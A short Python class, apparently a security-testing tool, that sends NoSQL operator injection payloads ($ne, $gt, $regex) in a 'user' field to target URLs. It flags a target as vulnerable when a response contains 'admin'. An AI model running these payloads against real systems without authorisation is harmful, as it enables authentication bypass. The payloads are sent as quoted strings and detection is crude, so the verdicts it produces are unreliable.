import requests

class NoSQLFuzzer:
    def __init__(self):
        self.name = "NoSQL Injection Fuzzer"
        self.payloads = [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}'
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                response = self.send_request(target, payload)
                results[f"{target} ({payload})"] = response
        return results

    def send_request(self, url, payload):
        try:
            response = requests.post(url, json={"user": payload}, timeout=5)
            if "admin" in response.text:
                return "VULNERABLE"
            return "SAFE"
        except requests.exceptions.RequestException:
            return "ERROR"
